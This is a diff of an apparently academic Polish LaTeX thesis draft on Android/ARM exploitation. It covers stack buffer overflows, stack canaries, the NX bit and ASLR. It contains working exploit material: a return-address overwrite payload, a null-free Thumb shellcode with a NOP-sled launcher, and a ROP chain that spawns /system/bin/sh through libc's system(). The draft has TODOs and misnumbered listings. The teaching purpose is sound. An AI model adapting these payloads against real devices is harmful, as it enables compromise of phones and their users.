+Android NDK jest zestawem popularnych narzędzi dedykowanych dla systemu Android. Pakiet ten został stworzony, aby umożliwić tworzenie aplikacji lub 
+ich części w C/C++. W jego skład wchodzą między innymi:
 \begin{itemize}
-\item różne wersje kompilatora \verb+gcc+ dla wybranych architektur procesora (ARM, x86, ...),
+\item różne wersje kompilatora GCC dla wybranych architektur procesora (ARM, x86, ...),
 \item standardowe narzędzia do debugowania i optymalizacji kodu, np. \verb+gdb+, \verb+gdbserver+, \verb+gcov+, \verb+ar+, \verb+ld+, \verb+objdump+,
 \item pliki nagłówkowe i skompilowane statyczne i dynamiczne biblioteki, np. \verb+libc+, \verb@libstdc++@, \verb+libz+, \verb+libm+.
 \end{itemize}
 
 Obydwa pakiety posiadają bogatą dokumentację oraz zawierają liczne przykłady użycia. Przykłady w dalszej części pracy będą używały powyższych narzędzi.
 
-
 \section{Aktualizacje systemu}\label{section:aktualizacje}
 
-System Android posiada wbudowany mechanizm aktualizacji całego systemu. Jednak nowe wersje systemu są dostarczane przez producenta zazwyczaj ze sporym opóźnieniem. 
-Wielu producentów urządzeń wraz ze standardową dystrybucją systemu załącza dodatkowe oprogramowanie np. \textit{HTC Sense} firmy HTC, nakładka graficzna 
-\textit{TouchWiz} firmy Samsung. Źródła systemu zazwyczaj są nieznacznie modyfikowane przez producenta dla każdego modelu telefonu, gdyż wymagają np. dodatkowych 
-sterowników urządzeń. Niektóre telefony posiadają także dodatkowe oprogramowanie operatora telefonii komórkowej.
-Nowe wersje systemu w pierwszej kolejności pojawiają się na urządzeniach z linii \textit{Google Nexus}, ponieważ nie zawierają one żadnych dodatkowych rozszerzeń
-producenta, ani firm telekomunikacyjnych. Bardzo wiele modeli nie otrzymuje dalszego wsparcia ze strony producenta. Jest to głównie spowodowane niewystarczającą 
-platformą sprzętową danego modelu. Bywa także, że decyzja o zaprzestaniu wydawania aktualizacji ma przyczyny biznesowe i producent nie ponosi nakładów na mało 
-popularne urządzenia.
+System Android posiada wbudowany mechanizm aktualizacji całego systemu. Jednak nowe wersje systemu są dostarczane przez producenta zazwyczaj ze sporym 
+opóźnieniem. Wielu producentów urządzeń wraz ze standardową dystrybucją systemu załącza dodatkowe oprogramowanie np. \textit{HTC Sense} firmy HTC, 
+nakładka graficzna \textit{TouchWiz} firmy Samsung. Źródła systemu zazwyczaj są nieznacznie modyfikowane przez producenta dla każdego modelu telefonu, 
+gdyż wymagają np. dodatkowych sterowników urządzeń. Niektóre telefony posiadają także dodatkowe oprogramowanie operatora telefonii komórkowej.
+Nowe wersje systemu w pierwszej kolejności pojawiają się na urządzeniach z linii \textit{Google Nexus}, ponieważ nie zawierają one żadnych dodatkowych 
+rozszerzeń producenta ani firm telekomunikacyjnych. Bardzo wiele modeli nie otrzymuje dalszego wsparcia ze strony producenta. Jest to głównie 
+spowodowane wzrastającymi wymaganiami sprzętowymi kolejnych wersji systemu, których starsze modele nie spełniają. Bywa także, że decyzja o zaprzestaniu 
+wydawania aktualizacji ma przyczyny biznesowe, gdyż producent nie chce ponosić dalszych nakładów na mało popularne urządzenia.
 
-Tabela \ref{table:zasieg} przedstawia udział najpopularniejszych wersji systemu. Zauważyć można, że największy udział mają wersje, których data premiery miała miejsce 
-ponad dwa lata temu.
+Tabela \ref{table:zasieg} przedstawia udział najpopularniejszych wersji systemu. Zauważyć można, że największy udział mają wersje, których data 
+premiery miała miejsce ponad dwa lata temu.
 
 \begin{table}
 \centering
-\caption[Udział wersji systemu Android]{Udział wersji systemu Android (stan na 2. kwietnia 2013 r.), źródło: \url{http://developer.android.com/about/dashboards/index.html}}
+\caption[Udział wersji systemu Android]{Udział wersji systemu Android (stan na 2 kwietnia 2013 r.), źródło: 
+\url{http://developer.android.com/about/dashboards/index.html}}
 \label{table:zasieg}
 \begin{tabular}{|l|l|l|}
 \hline
@@ -375,18 +389,20 @@ Wersja	& Nazwa kodowa	& Udział	\\
 \footnotetext{}
 \end{table}
 
-\chapter{Techniki ataków i sposoby na przeciwdziałanie}
+\chapter{Techniki ataków i sposoby przeciwdziałania}
 
 \todo{dodać krótkie wprowadzenie}
 
 \section{Błąd przepełnienie bufora na stosie}
 
-Przepełnienie bufora to błąd w kodzie programu umożliwiający wczytanie do wyznaczonego obszaru pamięci większej ilości danych, niż zarezerwował na ten cel programista. 
-Dane wykraczające poza rozmiar bufora nadpisują obszar pamięci bezpośrednio z nim sąsiadujący, który może zawierać inne dane lub informacje decydujące o przepływie 
-sterowania w wykonywanym programie.
+Przepełnienie bufora to błąd w kodzie programu umożliwiający wczytanie do wyznaczonego obszaru pamięci większej ilości danych, niż zarezerwował na ten 
+cel programista. Dane wykraczające poza rozmiar bufora nadpisują obszar pamięci bezpośrednio z nim sąsiadujący, który może zawierać inne dane lub 
+informacje decydujące o przepływie sterowania w wykonywanym programie.
 
-Na przykładnie poniższego programu, w którym występuję błąd umożliwiający przepełnienie bufora na stosie, zastanie omówiona technika ataku umożliwiająca zmianę zachowania programu.
+Na przykładzie programu \ref{print:overflow}, w którym występuje błąd umożliwiający przepełnienie bufora na stosie, zastanie omówiona 
+technika ataku pozwalająca na zmianę zachowania programu.
 
+\begin{print}
 \begin{verbatim}
  1: #include <stdio.h>
  2: #include <stdlib.h>
@@ -404,12 +420,15 @@ Na przykładnie poniższego programu, w którym występuję błąd umożliwiają
 14: int main(int argc, char *argv[]) {
 15:     if (argc < 0) exploit();
 16:     vulnerable(argv[1]);
-19: }
+17: }
 \end{verbatim}
+\caption{Przykładowy program z błędem powodującym przepełnienie bufora.}
+\label{print:overflow}
+\end{print}
 
-Powyższy przykład został skompilowany z optymalizacjami oraz do kodu maszynowego w trybie \verb+thumb+. Procedura \verb+exploit+ z linii 17 
-w trakcie normalnego wykonania programu nigdy nie powinna zostać wykonana. Użycie tej procedury powoduje, że nie zostanie ona usunięta w trakcie 
-optymalizacji kodu przez kompilator jako martwy kod.
+Program \ref{print:overflow} został skompilowany z optymalizacjami (\verb+-Os+) do kodu maszynowego w trybie Thumb-2. Wykonanie procedury 
+\verb+exploit+ w trakcie normalnego wykonania programu nigdy nie powinno nastąpić. Użycie tej procedury w linii 15 powoduje, że nie zostanie ona 
+usunięta w trakcie optymalizacji kodu przez kompilator jako martwy kod.
 
 \subsection{Nadpisanie adresu powrotu}
 
@@ -419,120 +438,122 @@ o rozmiarze 100 bajtów. Błędem jest niesprawdzenie długości przekazywanego 
 naruszeniem ochrony pamięci:
 
 \begin{verbatim}
-sh-3.2# ./stack-buffer-overflow `printf 'A%.0s' {1..108}`
+sh-3.2# ./buffer-overflow `printf 'A%.0s' {1..108}`
 Segmentation fault
 \end{verbatim}
 
-Aby zrozumieć dokładnie genezą błędu, należy zapoznać się z kodem assemblerowym procedury \verb+vulnerable+: 
+\SaveVerb{vuln}|vulnerable|
+\begin{print}
 \begin{verbatim}
-(gdb) disassemble vulnerable 
-Dump of assembler code for function vulnerable:
 1:   push	{lr}
-2:   sub	sp, #108	; 0x6c
+2:   sub	sp, #108
 3:   adds	r1, r0, #0
 4:   mov	r0, sp
 5:   blx	0x83d0
-6:   add	sp, #108	; 0x6c
+6:   add	sp, #108
 7:   pop	{pc}
-End of assembler dump.
 \end{verbatim}
+\caption{Kod assemblerowy procedury \protect\UseVerb{vuln}.}
+\label{print:vulnerable}
+\end{print}
 
-Procedura ta kolejno wykonuje:
+Aby dokładnie zrozumieć genezą błędu, należy zapoznać się z kodem assemblerowym procedury \verb+vulnerable+, przedstawionym na wydruku 
+\ref{print:vulnerable}. Wykonuje ona kolejno:
 \begin{itemize}
-\item Odkłada na stos adres powrotu, który jest przechowywany w rejestrze LR.
-\item Powiększa stos, aby utworzyć miejsce na lokalny bufor \verb+buffer+. Alokowane jest nadmiarowo 108 bajtów.
-\item Przygotowuje argumenty wywołania procedury \verb+strcpy+. Ustawiane są wartości rejestrów R0 i R1 na wskaźniki do odpowiednich obszarów pamięci.
-\item Wykonuje procedurę \verb+strcpy+.
-\item Przywraca poprzednią wartość wierzchołka stosu, tak aby wskazywał na wcześniej odłożony adres powrotu.
-\item Wczytuje adres powrotu do rejestru PC. Powoduje to dalsze wykonywanie przez program kodu od tego adresu.
+\item Odkłada na stos adres powrotu, który jest przechowywany w rejestrze LR (linia 1).
+\item Powiększa stos, aby utworzyć miejsce na lokalny bufor \verb+buffer+. Alokowane jest nadmiarowo 108 bajtów (linia 2)
+\item Przygotowuje argumenty wywołania procedury \verb+strcpy+. Do rejestru R1 zapisywany jest adres początku bufora \verb+arg+, przekazanego
+jako argument procedury \verb+vulnerable+ (linia 3). Do rejestru R0 zapisywany jest adres początku lokalnego bufora \verb+buffer+, który znajduje 
+się na szczycie stosu (linia 4).
+\item Wykonuje skok do procedury \verb+strcpy+ (linia 5).
+\item Przywraca poprzednią wartość wierzchołka stosu, tak aby wskazywał na wcześniej odłożony adres powrotu (linia 6).
+\item Wczytuje adres powrotu do rejestru PC. Powoduje to dalsze wykonywanie przez program kodu od tego adresu (linia 7).
 \end{itemize}
 
-Procedura \verb+strcpy+ kopiuje łańcuch znaków zakończony przez wartość \verb+\0+ do obszaru pamięci wskazywanego przez pierwszy argument. Ponieważ 
+Procedura \verb+strcpy+ kopiuje łańcuch znaków zakończony bajtem o wartości zero do obszaru pamięci wskazywanego przez pierwszy argument. Ponieważ 
 przekazano napis znacznie dłuższy, od zaalokowanej pamięci, nadpisany został obszar pamięci, który znajduje się bezpośrednio za docelowym buforem, w tym
 zapisany tam wcześniej adres powrotu. Ostatnia instrukcja procedury \verb+vulnerable+ wczytuje do rejestru PC wartość wprowadzoną przez użytkownika,
 która nie jest poprawnym adresem kodu programu.
 
-Jeżeli adres powrotu zostanie nadpisany przez inny, poprawny adres kodu, możliwa będzie zmiena przepływu sterowania w programie. Umieszczenie
-w tym miejscu adresu początku kodu funkcji \verb+exploit+ spowoduje, że zostanie wykonana po zakończeniu procedury \verb+vulnerable+.
+Jeżeli adres powrotu zostanie nadpisany przez inny, poprawny adres kodu, możliwa będzie zmiana przepływu sterowania w programie. Umieszczenie
+w tym miejscu adresu początku kodu procedury \verb+exploit+ spowoduje, że zostanie ona wykonana po zakończeniu procedury \verb+vulnerable+.
 
-Adres początku kodu funkcji \verb+exploit+ można uzyskać przy pomocy narzędzia \verb+gdb+:
+Adres początku kodu funkcji \verb+exploit+ można uzyskać za pomocą narzędzia \verb+gdb+:
 \begin{verbatim}
 (gdb) x/x exploit 
 0x84d0 <exploit>:	0x4803b508
 \end{verbatim}
 
-Ponieważ na bufor \verb+buffer+ zostało zaalokowanych na stosie 108 bajtów, wartość, która ma zostać wczytana do rejestru licznika instrukcji, należy umieścić
-na 109. i 110. pozycji. Kod maszynowy funkcji exploit jest skompilowany w trybie \verb+thumb+, więc aby został poprawnie zinterpretowany przez
-procesor, adres funkcji \verb+exploit+, tj. \verb+0x84d0+, trzeba zwiększyć o 1. Wartość ta musi też być zapisana w takiej kolejności bajtowej, w jakiej
-został skompilowany program. Domyślnie jest to little-endian. Poniżej uzyskujemy spodziewany efekt, czyli wykonanie procedury \verb+exploit+, która
-wypisuje napis na standardowe wyjście:
+Aby doprowadzić do wykonania procedury \verb+exploit+, należy uruchomić program z dostatecznie długim argumentem. Ponieważ na bufor \verb+buffer+ 
+zostało zaalokowanych na stosie 108 bajtów, wartość, która ma zostać wczytana do rejestru licznika instrukcji, należy umieścić na pozycjach 
+109~--~112. Wartość ta musi też być zapisana w takiej kolejności bajtowej, w jakiej został skompilowany program. Domyślnie jest to little-endian.
+Cały argument musi być poprawnym napisem, a więc nie może zawierać bajtu o wartości zero. Skonstruowanie takiego argumentu jest jednak możliwe, 
+dzięki odpowiedniej kolejności bajtowej przekazywanego adresu -- najmniej znaczące bajty adresu będą położone jako pierwsze. Natomiast bardziej 
+znaczące bajty adresu, które są równe zero, poprawnie zakończą napis. Kod maszynowy funkcji \verb+exploit+ jest skompilowany w trybie Thumb-2,
+więc aby został poprawnie zinterpretowany przez procesor, adres funkcji \verb+exploit+, tj. \verb+0x84d0+, trzeba zwiększyć o 1. Poniżej uzyskujemy 
+spodziewany efekt, czyli wykonanie procedury \verb+exploit+, która wypisuje napis na standardowe wyjście:
 
 \begin{verbatim}
-sh-3.2# ./stack-buffer-overflow `printf 'A%.0s' {1..108}; printf '\xd1\x84'`
+sh-3.2# ./buffer-overflow `printf 'A%.0s' {1..108}; printf '\xd1\x84\x00\x00'`
 Exploited!
 \end{verbatim}
 
 \subsection{Zabezpieczenie ProPolice}
 
 W nowoczesnych kompilatorach zostało dodane zabezpieczenie, które znacząco utrudnia wykonywanie ataków polegających na nadpisywaniu niektórych danych 
-znajdujących się na stosie. Kod maszynowy funkcji, które alokują bufor na stosie, jest wzbogacony o dodatkowe sprawdzenie, czy nie wystąpiło przepełnienie
-bufora. Polega ono na umieszczeniu na stosie małego, losowego ciągu znaków, tzw. ,,kanarka'', ,,ciasteczka'' (ang. \textit{canaries}, \textit{cookie}).
-Znacznik ten jest umieszczany pomiędzy obszarem pamięci przeznaczonym na zmienne lokalne procedury, a danymi kontrolnymi programu odkładanymi na stosie, 
-np. adresem powrotu z funkcji, wskaźnikiem ramki, itp. Jeżeli dojdzie do przepełnienia bufora, znacznik ten zostanie nadpisany. Dzięki temu, że jego wartość
-jest losowa, atakujący z bardzo małym prawdopodobieństwem może zgadnąć odpowiednią wartość. W epilogu procedury wykonywane jest sprawdzenie, czy wcześniej 
-zapisana wartość nie została zmodyfikowana. W przypadku wykrycia przepełnienia buforu, działanie programu kończone jest błędem.
+znajdujących się na stosie. Kod maszynowy funkcji, która alokuje bufor na stosie, jest wzbogacany o dodatkowe sprawdzenie, czy nie wystąpiło 
+przepełnienie bufora. Polega ono na umieszczeniu na stosie małego, losowego ciągu znaków, tzw. ,,kanarka'' lub ,,ciasteczka'' (ang. \textit{canaries}, 
+\textit{cookie}). Znacznik ten jest umieszczany pomiędzy obszarem pamięci przeznaczonym na zmienne lokalne procedury a danymi kontrolnymi programu 
+odkładanymi na stosie, np. adresem powrotu z funkcji, wskaźnikiem ramki itp. Jeżeli dojdzie do przepełnienia bufora, znacznik ten zostanie nadpisany. 
+Dzięki temu, że jego wartość jest losowa, atakujący z bardzo małym prawdopodobieństwem może zgadnąć odpowiednią wartość. W epilogu procedury wykonywane 
+jest sprawdzenie, czy wcześniej zapisana wartość nie została zmodyfikowana. W przypadku wykrycia przepełnienia buforu, działanie programu kończy się 
+błędem.
 
-W kompilatorze \verb+gcc+ zabezpieczenie to nazywane jest \verb+ProPolice+. Do jego włączenia lub wyłączenia służą flagi kompilatora: \verb+--stack-protector+
-i \verb+--no-stack-protector+. W zestawie narzędzi Android NDK zostało dodane w wersji 1.5 i domyślnie jest włączone. Począwszy od tej wersji, także wszystkie 
-źródła bibliotek systemowych są skompilowane z włączoną ochroną. 
+W kompilatorze GCC zabezpieczenie to nazywane jest \verb+ProPolice+. Do jego włączenia lub wyłączenia służą flagi kompilatora: \verb+--stack-protector+
+i \verb+--no-stack-protector+. W zestawie narzędzi Android NDK zostało dodane w wersji 1.5 i domyślnie jest włączone. Począwszy od tej wersji, także 
+wszystkie źródła bibliotek systemowych są skompilowane z włączoną ochroną. 
 
-Kod assemblera funkcji \verb+vulnerable+ z powyższego przykładu z włączonym zabezpieczeniem \verb+ProPolice+ wygląda następująco:
+Kod assemblera funkcji \verb+vulnerable+ z przykładu \ref{print:overflow} z włączonym zabezpieczeniem \verb+ProPolice+ wygląda został umieszczony
+na wydruku \ref{print:vulnerable-propolice}. W instrukcjach 2 -- 6 pobierana jest wartość ciasteczka i umieszczana w odpowiednim miejscu na stosie. 
+Natomiast instrukcje 11 -- 15 sprawdzają czy wartość ta nie została zmieniona.
+
+Należy zauważyć, że powyższa metoda wykrywania przepełnienia buforów chroni jedynie dane kontrolne programu. W dalszym ciągu możliwe jest 
+zmodyfikowanie innych zmiennych lokalnych procedury, co może doprowadzić do niezamierzonego zachowania programu.
+
+\SaveVerb{propolice}|ProPolice|
+\begin{print}
 \begin{verbatim}
  1:  push	{r4, lr}
- 2:  ldr	r4, [pc, #36]	; (0x8570 <vulnerable+40>)
- 3:  sub	sp, #104	; 0x68
+ 2:  ldr	r4, [pc, #36]	; (<vulnerable+40>)
+ 3:  sub	sp, #104
  4:  adds	r1, r0, #0
  5:  add	r4, pc
  6:  ldr	r4, [r4, #0]
  7:  mov	r0, sp
  8:  ldr	r3, [r4, #0]
- 9:  str	r3, [sp, #100]	; 0x64
+ 9:  str	r3, [sp, #100]
 10:  blx	0x8450
-11:  ldr	r2, [sp, #100]	; 0x64
+11:  ldr	r2, [sp, #100]
 12:  ldr	r3, [r4, #0]
 13:  cmp	r2, r3
 14:  beq.n	0x856a <vulnerable+34>
 15:  blx	0x845c
-16:  add	sp, #104	; 0x68
+16:  add	sp, #104
 17:  pop	{r4, pc}
 \end{verbatim}
+\caption{Kod assemblerowy procedury \protect\UseVerb{vuln} z włączoną ochroną \protect\UseVerb{propolice}.}
+\label{print:vulnerable-propolice}
+\end{print}
 
-W instrukcjach 2 -- 6 pobierana jest wartość ciasteczka i umieszczana w odpowiednim miejscu na stosie. Natomiast instrukcje 11 -- 15 sprawdzają czy wartość ta 
-nie została zmieniona.
+\section{Wstrzyknięcie kodu}
 
-Należy zauważyć, że powyższa metoda wykrywania przepełnienia buforów chroni jedynie dane kontrolne programu. W dalszym ciągu możliwe jest zmodyfikowanie innych 
-zmiennych lokalnych procedury, co może doprowadzić do niezamierzonego zachowania programu.
-
-\section{Wstrzyknięcie kodu}\todo{niedokończone}
-
-W przykładzie w poprzednim punkcie, został zaprezentowany jeden ze sposobów na wykorzystanie błędu programistycznego w celu zmiany sterowania programu.
-Uruchomienie programu z odpowiednio spreparowanym argumentem pozwoliło wywołać dowolną procedurę programu. Zazwyczaj jest to jednak niewystarczające, 
-aby atakujący mógł osiągnąć zamierzone cele. Możliwe jest dalsze zmodyfikowanie przekazywanego przez argument napisu tak, aby spowodować wykonanie dowolnego
-dostarczonego przez atakującego kodu.
-
-Bufor przekazywany przez argument może zostać wypełniony kodem maszynowym zgodnym z architekturą procesora danego urządzenia. Takie fragmenty kodu
-maszynowego, przekazywana w trakcie wykonywania ataku, nazywane są \textit{shellcodem}. Tworzenie tego typu wstawek zosatnie omówione w rozdziale \ref{chapter:shellcode}.
-W przypadku omawianego przykładu istnieje dodatkowe wymaganie, aby przekazany kod nie zawierał znaku \verb+\x00+, ponieważ jest on interpretowany jako napis.
-
-Aby program zaczął wykonywać dostarczony kod, adres powrotu należy nadpisać w taki sposób, aby wskazywał jedną z początkowych wartości bufora, w którym zostanie umieszczony shellcode.
-
-
-\begin{tikzpicture}[node distance=0mm ]
+\begin{figure}
 \centering
+\begin{tikzpicture}[node distance=0mm ]
 \node[punkt] (nop) {NOP};
 \node[punkt, right=of nop] (shell) {shellcode};
 \node[punkt, right=of shell] (ret) {adres powrotu}
-  edge[pil, bend right=30] (nop.north);
+  edge[pil, bend right=120] (nop.north west);
 
 \node[below=of nop] (stackdummy) {\phantom{adresa}};
 \node[below=of ret] (stack) {stos}
@@ -541,36 +562,194 @@ Aby program zaczął wykonywać dostarczony kod, adres powrotu należy nadpisać
 \node[below=of stackdummy] (adresy) {adresy}
   edge[pil] (adresydummy.east);
 \end{tikzpicture}
+\caption{Stos}
+\label{figure:stackoverflow}
+\end{figure}
+
+\begin{print}
+\begin{verbatim}
+ 1:  char *sh[2] = { "/system/bin/ls", NULL };
+ 2:  execve(sh[0], sh, NULL);
+\end{verbatim}
+\caption{Kod w języku C}
+\label{print:c-shellcode}
+\end{print}
+
+\begin{print}
+\begin{verbatim}
+ 1: #include <unistd.h>
+ 2: #include <stdlib.h>
+ 3: 
+ 4: char shellcode[] = { 
+ 5:  '\x5b', '\x40',     // eor r3, r3
+ 6:  '\xff', '\x27',     // movs r7, #255
+ 7:  '\x0c', '\xa1',     // add r1, pc, #48
+ 8:  '\x0b', '\x60',     // str r3, [r1]
+ 9:  '\x04', '\xa1',     // add  r1, pc, #16
+10:  '\x0a', '\x68',     // ldr  r2, [r1, #0]
+11:  '\xba', '\x43',     // bics r2, r7
+12:  '\x0a', '\x60',     // str  r2, [r1, #0]
+13:  '\x03', '\xa1',     // add r1, pc, #12
+14:  '\x4b', '\x60',     // str r3, [r1, #4]
+15:  '\x04', '\xa0',     // add r0, pc, #16
+16:  '\x08', '\x60',     // str r0, [r1]
+17:  '\x1a', '\x1c',     // mov r2, r3
+18:  '\x0b', '\x27',     // mov r7, #11
+19:  '\xcc', '\xdf',     // svc 0xcc
+20:  '\xcc', '\xcc',
+21:  '\xcc', '\xcc', '\xcc', '\xcc',
+22:  '\xcc', '\xcc', '\xcc', '\xcc',           
+23:  '/', '/', '/', 's', 
+24:  'y', 's', 't', 'e', 
+25:  'm', '/', 'b', 'i', 
+26:  'n', '/', 'l', 's',
+27:  '\xcc', '\xcc', '\xcc', '\xcc'
+28: };
+29:
+30: char nop[] = { '\xc0', '\x46' };
+31:  
+30: void main(int argc, char *argv[]) {
+31:   unsigned long size = strtoul(argv[1], NULL, 10);
+32:   unsigned long ret = strtoul(argv[2], NULL, 16);
+33:   char *payload = malloc(size + 4);
+34:   unsigned long i = 0;
+35:   while (i < size - sizeof(shellcode) - sizeof(ret)) {
+36:     memcpy(payload + i, nop, sizeof(nop));
+37:     i += sizeof(nop);
+38:   }
+39:   memcpy(payload + i, shellcode, sizeof(shellcode));
+30:   i += sizeof(shellcode);
+31:   *(unsigned long *)(payload + i) = ret;
+32:   *(payload + size) = '\x00';
+33:   execl("./buffer-overflow", "./buffer-overflow", payload, NULL);
+34: }
+\end{verbatim}
+\caption{Kod maszynowy i assemblerowy shellcode'u}
+\label{print:asm-shellcode}
+\end{print}
+
+W przykładzie z poprzedniego punktu został zaprezentowany jeden ze sposobów na wykorzystanie błędu programistycznego w celu zmiany sterowania programu.
+Uruchomienie programu z odpowiednio spreparowanym argumentem pozwoliło wywołać dowolną procedurę programu. Zazwyczaj jest to jednak niewystarczające, 
+aby atakujący mógł osiągnąć zamierzone cele. W punkcie tym zostanie zaprezentowany atak, w trakcie którego przekazywany jest kod maszynowy zgodny 
+z architekturą procesora danego urządzenia. Takie fragmenty kodu maszynowego nazywane są \textit{shellcodem}. Tworzenie tego typu wstawek zostanie 
+omówione w rozdziale \ref{chapter:shellcode}. Aby przekazany kod został wykonany przez program potrzebne jest odpowiednie ustawienie wartości
+licznika instrukcji na adres pamięci, w którym umieszczony jest shellcode. Sposób, w jaki zostanie to zrobione, jest zależny od błędu w programie.
+Poniżej zostanie przedstawione wstrzyknięcie kodu z wykorzystaniem nadpisania adresu powrotu z podprogramu, co zostało opisane w poprzednim
+punkcie. Można jednak także wykorzystać w tym celu dowolny inny błąd w programie. 
+
+Program z przykładu \ref{print:overflow} można uruchomić z argumentem, w którym pierwsze 108 bajtów jest kodem maszynowym, który zostanie wykonany w 
+trakcie ataku, natomiast adres powrotu zostanie nadpisany w taki sposób, aby wskazywał początek obszaru pamiąci na stosie zaalokowanego na bufor 
+\verb+buffer+. Ponieważ wstrzykiwany kod maszynowy ma mniejszy rozmiar, należy go poprzedzić odpowiednią liczbą instrukcji NOP (ang. 
+\textit{no operation}). Po wykonaniu linii 11 programu, stos będzie wypełniony tak, jak na rysunku \ref{figure:stackoverflow}.
+
+Na wydruku \ref{print:asm-shellcode} został przedstawiony kod maszynowy (\textit{shellcode} wraz z odpowiednimi instrukcjami assemblera. Realizuje on 
+instrukcje w języku C z wydruku \ref{print:c-shellcode}. Kod maszynowy został stworzony w taki sposób, aby żaden jego bajt nie był równy zero.
+Dzięki temu może być przekazany jako napis poprzez argument programu. 
+
+Aby program zaczął wykonywać dostarczony kod, adres powrotu należy nadpisać w taki sposób, aby wskazywał jedną z początkowych wartości bufora, w 
+którym zostanie umieszczony shellcode. Adres ten można uzyskać uruchamiając program pod kontrolą debuggera \verb+gdb+. Ponieważ jest on przekazywany 
+jako pierwszy argument procedury \verb+strcpy+ w linii 11 programu \ref{print:overflow}, należy odczytać wartość rejestru R0 w trakcie wykonania 
+procedury \verb+vulnerable+. Zostało to zaprezentowane na wydruku \ref{print:getsp}. Położenie stosu w kolejnych uruchomieniach programu jest takie 
+samo, ponieważ została wyłączona randomizacja przestrzeni adresowej procesu. Zostanie to opisane w punkcie \ref{section:aslr}.
+
+\SaveVerb{buffer}|buffer|
+\begin{print}
+\begin{verbatim}
+(gdb) disassemble 
+Dump of assembler code for function vulnerable:
+   0x000084c4 <+0>:	push	{lr}
+   0x000084c6 <+2>:	sub	sp, #108	; 0x6c
+   0x000084c8 <+4>:	adds	r1, r0, #0
+   0x000084ca <+6>:	add	r0, sp, #4
+=> 0x000084cc <+8>:	blx	0x83d8
+   0x000084d0 <+12>:	add	sp, #108	; 0x6c
+   0x000084d2 <+14>:	pop	{pc}
+(gdb) print/x $sp
+$3 = 0xbefffa78
+(gdb) print/x $r0
+$4 = 0xbefffa7c
+\end{verbatim}
+\caption{Odczytanie adresu bufora \protect\UseVerb{buffer}.}
+\label{print:getsp}
+\end{print}
 
 
-%\subsection{}
-% noexecutestack
 
-\subsection{NX bit}
+\subsection{Bit NX}
 
-W celu ochrony przed tego typu takimi w wersji 6 architektury ARM wprowadzona została technologia NX bit (No Execute). Umożliwia ona systemowi operacyjnemu 
-oznaczyć wybrane strony pamięci jako niewykonywalne. Gdy bit NX dla danej strony jest ustawiony, próba wykonania zawartości tej strony jako kodu kończy się 
-wygenerowaniem wyjątku, zgłaszanego systemowi operacyjnemu, co powoduje przerwanie wykonywania programu. Bit NX powinien być ustawiony dla wszystkich stron procesu, 
-z wyjątkiem programu i bibliotek oraz świadomie dozwolonych przez program wyjątków.
+W celu ochrony przed tego typu atakami w wersji 6 architektury ARM wprowadzona została technologia bitu NX (ang. \textit{No Execute}). Umożliwia ona 
+systemowi operacyjnemu oznaczyć wybrane strony pamięci jako niewykonywalne. Gdy bit NX dla danej strony jest ustawiony, próba wykonania zawartości tej 
+strony jako kodu kończy się wygenerowaniem wyjątku, zgłaszanego systemowi operacyjnemu, co powoduje przerwanie wykonywania programu. Bit NX powinien 
+być ustawiony dla wszystkich stron procesu, z wyjątkiem programu i bibliotek oraz świadomie dozwolonych przez program wyjątków.
 
-Technologia ,,NX bit'' jest wspierana przez Androida od wersji 2.3. 
+Technologia ,,NX bit'' jest wspierana przez system Android od wersji 2.3. 
 
+\section{Return-oriented programming}
 
-
-\section{Technika ,,heap spray''}
-
-%przeciwdziałanie: DEP, NX bit, Executable space protection
-
-
-
-
-
- wyko dzięki któremu system operacyjny 
-
-\section{Technika ,,return to library'' (Ret2Libc)}
 
 % przeciwdziałanie: ASLR
+\begin{print}
+\begin{verbatim}
+   0x189d8 <getcwd+12>:	mov	r0, r4
+   0x189da <getcwd+14>:	pop	{r4, pc}
+\end{verbatim}
+\label{print:getcwd-chunk}
+\caption{Gadżet}
+\end{print}
 
+%(gdb) x/2i 0x4001a9d9
+%   0x4001a9d9:	mov	r0, r4
+%   0x4001a9db:	pop	{r4, pc}
+
+\SaveVerb{binsh}|"/system/bin/sh"|
+\SaveVerb{libc}|libc.so|
+\begin{print}
+\begin{verbatim}
+(gdb) x/s 0x003ad3a
+0x3ad3a:	 "/system/bin/sh"
+\end{verbatim}
+\caption{Napis \protect\UseVerb{binsh} w bibliotece \protect\UseVerb{libc}.}
+\label{print:binsh}
+\end{print}
+
+%(gdb) x/s 0x4003cd3a
+%0x4003cd3a:	 "/system/bin/sh"
+
+\begin{print}
+\begin{verbatim}
+ 1: #include <unistd.h>
+ 2: #include <stdlib.h>
+ 3:
+ 4: #define OFFSET 0x40002000
+ 5:
+ 6: unsigned long rop[] = { 
+ 7:   OFFSET + 0x000189db,      // pop	{r4, pc}
+ 8:   OFFSET + 0x00031d3a,      // "/system/bin/sh"
+ 9:   OFFSET + 0x000189d9,      // mov	r0, r4
+10:                             // pop  {r4, pc}
+11:   0xcccccccc,
+12:   OFFSET + 0x0001a3a5,      // system(const char *)
+13:   0
+14: };
+15: 
+16: void main(int argc, char *argv[]) {
+17:   unsigned long size = strtoul(argv[1], NULL, 10);
+18:   char *payload = malloc(size + sizeof(rop));
+19:   memset(payload, 'X', size);
+20:   memcpy(payload + size, rop, sizeof(rop));
+21:   execl("./buffer-overflow", "./buffer-overflow", payload, NULL);
+21: }
+\end{verbatim}
+\caption{Program przeprowadzający atak z wykorzystaniem \textit{return-oritented programming}}
+\end{print}
+
+\subsection{Address space layout randomization (ASLR)}\label{section:aslr}
+
+% https://blog.duosecurity.com/2012/02/a-look-at-aslr-in-android-ice-cream-sandwich-4-0/
+% https://blog.duosecurity.com/2012/07/exploit-mitigations-in-android-jelly-bean-4-1/
+% https://www.kernel.org/doc/Documentation/sysctl/kernel.txt (randomize-va-space)
+
+%\section{Technika ,,heap spray''}
 \chapter{Tworzenie shellcode'u}\label{chapter:shellcode}
 
 
